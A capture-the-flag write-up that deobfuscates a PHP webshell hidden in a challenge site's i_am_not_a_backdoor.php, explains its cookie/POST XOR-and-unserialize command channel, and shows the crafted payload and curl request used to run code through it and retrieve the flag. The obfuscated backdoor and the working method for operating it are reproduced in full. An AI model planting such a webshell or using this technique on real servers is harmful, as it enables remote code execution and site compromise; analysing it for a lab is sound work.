# SCRIPT_KIDDING

## What it is

A website with this text:
```
Niark niark niark, I infected this website with a webshell that I found on the internet, but I forgot to read the instructions T_T
Can you help me find out how to use it ? I swear I did not hide it in i_am_not_a_backdoor.php
```

(see i_am_not_a_backdoor.php)

i_am_not_a_backdoor.php:
```php
<?php


eval("\n\$dgreusdi = intval(__LINE__) * 337;"); // 2 * 337 = 674
// print $dgreusdi;

$a = "7VdrbyI3FP3Or3AQCjOCRMyD7KYJUbKrZHfVdLNtmrRSlI7MYMBkXvIMkG2T/97jGQY8BrbRdqW2UkcawPbxuef6XtuXUx5xL2WZ0WRCxMIL4lGzTT7eXF6aR7XT5SC6vRyQYrRTGQrpo8cemT/NeBx5GQ9ZCcFw3vYCHvLMkH21WoMmiYhnN674hJj1zgi6F3GAtG/T674xGt7bq6vvP5wTmpKGH8cPnHlxxHonZSObx2btjxrBU2FSxsGXD4c0oiMmPB7Ne674alOgUH0hKn0ggWxjMIZlnGhOH1acoOXG/A/HjAjBXSbG+iN8mCkg+JCs77Cs3y6cPXh6O8+Vx7hvPTyM/V8VDOYF7IMmqUXgqWTUV674NCn1m7Mffry14svz0ZvLm7P0/bllXf86P/t0HXy8vT3rvr2Zn1/eWNa7n4LRm18uPryv6746lOtQZ9LBp4aSZ4N674pzvWjDsaJHs78YJr+V4zmZdHRH9bSYo4Tz09X1z4tgRpjXn2YymIKljAp/rC9NNaQlarGqXwxqSa5iv11gFdZNsa06ocW4iPN6t674P6wLx02g95mqJtNBIWJwFrS2+CgPZjQTO2zHV4OOQiL674QxOFSvL0RhsaGI9zpHpMGP674ZyALckQc32JC/gkh0+WcNUk2d3dwCThrRbU8VZrm9cN9pixSHrjJVTQ674DJjMSgp7hr83kQC5V2KwbvG5F5d4c3+6j37xB8LQ7dorq95JYurJKscRgxwlq3ietekD02ofXoiO4a2U6rbt6742ag+GM8knChnTC5slwQg9Hk8Fo674rMRnwySNB5MhqxpmqTXI2sWNp1lZ0LQz4Yp1TGcjwtIOudZvqdUCjCsQuAjqUmd17+rLiWVdCrt+uhdM5k1746745TcbJjIk8Ibcg0wLZtPY7e1azimH+OCY49wWnAf9dbiw5RyPS9kahmmmqGRysuDpo3m/nKWLNHnHLy674xSt1l14zcGNKNI4gf2WTvgTqfRSnfqC8aiyu5UJuaRqSk2NsDx2wNWHqf4JVNlGWp0YP3Wtv9yxjdKt6NK5m8yp4rTLgf9gORRMs2WHvSnwy674Ti0Mo78n6QZlhxFhGac9q/933H+M6sLW20yZd9HXlt7vi6nbRPsD7Cu9rvIfAdvD+BT8g+LRXROB1MR0z2wRcoAKTJWHAWbBsAW674BYgFjAWQBZQFmHa5IbOBtyQu8DbwNvN3drsIGjw0eGzw27DkdRRDGHfA44HHA44DHAd4B3gHeAd6FPRc4FzhXegCcC5wLnPtqxeUC7wLfBb77H8u674/7n+rVxmtQTCCZQXQeSYlMVLcW4dofhVisx+DqxWdDjA7vLCJJ+Rlyr3ZKcnjehFjpy+ZcIu6TxeXJjk+Bg7Uy9F5CPvc50PBVX1YpPVLI+mTCVYqY+m4Qb9nLSIteZ4XsqtKW1ZX3YOH0/6742OBiMVF10taLBKhT3Xmurcu0XyrT/lqZtibz4CtUOi9V6bx6745bZ5C5674vljcf84CBTibBCf5l6xb9PDf7C94OHpOcnOC60CwsbvD9Xl5674+7qAPlatR16vy9rb25TVcsF6xFVrsbLgLgzJ4uJP";
$a = str_replace($dgreusdi, "E", $a);
eval (gzinflate(base64_decode($a)));
```

After changing the last ```eval``` call to a ```print``` and executing it we get another php script (see backdoor.php).

The name of variables and functions in it are purposefully misleading.

### Breakdown of each function

```php
function _base64_decode($input)
```
Decodes base64

```php
function improve_meta()
{
    return _base64_decode("UAMQV1oLEgBLUAsHE11SXwAPSlNVVA5CUwELU11GRlgBWFIH" ) ;
}
```
A constant, basically.


```php
function append_strings($append, $string)
{
    return $append ^ $string;
}
```
Xors 2 strings ([source](https://stackoverflow.com/a/34248791/12864941)).

```php
function make_submission($people, $collaborate)
```
Xors 2 strings, the second can be shorter than the first, in that case it start again from the beginning.

```php
function screen_submission($sub_key, $sub_meta)
{
    $sub = make_submission($sub_key, append_strings(improve_meta(), 'dfvaijpefajewpfja9gjdgjoegijdpsodjfe'));

    return make_submission($sub, $sub_meta) ;
}
```
Xors ```sub_key``` with the xor of ```improve_meta``` and another constant, then xors that with ```sub_meta```.


```php
function remove_letter($data, $key)
{
    return @unserialize(screen_submission($data, $key));
}
```
[Unserializes](https://www.php.net/manual/en/function.unserialize.php) the result of ```screen_submission```.

### Other code

```php
foreach ($_COOKIE as $cookie_one=>$cookie_two)
{
    $approvals = $cookie_two;

    $manager_invitation = $cookie_one;

    $approvals = remove_letter(_base64_decode($approvals), $manager_invitation) ;

    if ($approvals)
    {
        break;
    }
}
```
Tries to use ```remove_letter``` on each cookie, decodes the data with base64.

```php
if (!$approvals)
{
    foreach ($_POST as $contribute=>$research)
    {
        $approvals = $research;

        $manager_invitation = $contribute;

        $approvals = remove_letter(_base64_decode($approvals), $manager_invitation);

        if ($approvals)
        {
            break;
        }
    }
}
```
Same as previous code but it tries to find the key/data in the body.

```php
if (!isset($approvals['ak']) || !(append_strings(improve_meta(), 'dfvaijpefajewpfja9gjdgjoegijdpsodjfe')) == $approvals['ak'])
{
    $approvals = Array();
}
else
{
    switch ($approvals['a']){
        case "i":
            $array = Array();
            $array['pv'] = @phpversion();
            $array['sv'] = '1.0-1';
            echo @serialize($array);
            break;
        case "e":
            eval($approvals['d']);
            break;
    }
    exit();

}
```
Checks that the key ```ak``` is equal to a specific value.
if ```approvals['a'] == 'i'``` prints general information.
if ```approvals['a'] == 'e'``` executes the code in ```approvals['d']```.

### Recap

- get the key and data from cookies or body
	- decode the data with base64
	- xors it with the result of ```improve_meta() ^ 'dfvaijpefajewpfja9gjdgjoegijdpsodjfe'```
	- xors the result with the key provided
	- unserializes the result
- checks that ```data['ak'] == improve_meta() ^ 'dfvaijpefajewpfja9gjdgjoegijdpsodjfe'```
- if ```data['a'] == 'i'``` print info
- if ```data['a'] == 'e'``` execute code in ```data['d']```

## Solution

(see gen_data.py)

Do the same process but backwards.

Start with the desired data:
```json
{
	"ak": "4ef63abe-1abd-45a6-913d-6fb99657e24b", // improve_meta() ^ 'dfvaijpefajewpfja9gjdgjoegijdpsodjfe'
	"a": "e",
	"d": "echo implode(', ', scandir('.'));" // list files in the current directory
}
```

Select a key (any will do): ```abc```

- Serialize it
- xor it with the key
- xor it with ```4ef63abe-1abd-45a6-913d-6fb99657e24b```
- encode it to base64

We get:
```
ND02bSpxOTV0cmJqJ3QkbjBjdnlmN2B4ZGVjPXZkNTdifmI0NDEobmAxZyp4NmE4PHliY2ZneDlwaXV0Zj4jOXluJ283aXRkdzx2bWA4IWNsa3A7NnxtdmY2JDRyO2s+O2tlPXNyeHUhf3ZyNmZrMzhwKyBgdyooPm1sKQ==
```
```
$ curl -XPOST https://script-kidding.secu-web.blackfoot.dev/i_am_not_a_backdoor.php -F "abc=ND02bSpxOTV0cmJqJ3QkbjBjdnlmN2B4ZGVjPXZkNTdifmI0NDEobmAxZyp4NmE4PHliY2ZneDlwaXV0Zj4jOXluJ283aXRkdzx2bWA4IWNsa3A7NnxtdmY2JDRyO2s+O2tlPXNyeHUhf3ZyNmZrMzhwKyBgdyooPm1sKQ=="
., .., i_am_a_secret_file, i_am_not_a_backdoor.php, index.php, nottheflag
```

```
$ curl https://script-kidding.secu-web.blackfoot.dev/i_am_a_secret_file
PLZ{D0n.t_t3ll_m0mMY_|_w4$_n4ugh7¥}
```

flag: ```PLZ{D0n.t_t3ll_m0mMY_|_w4$_n4ugh7¥}```
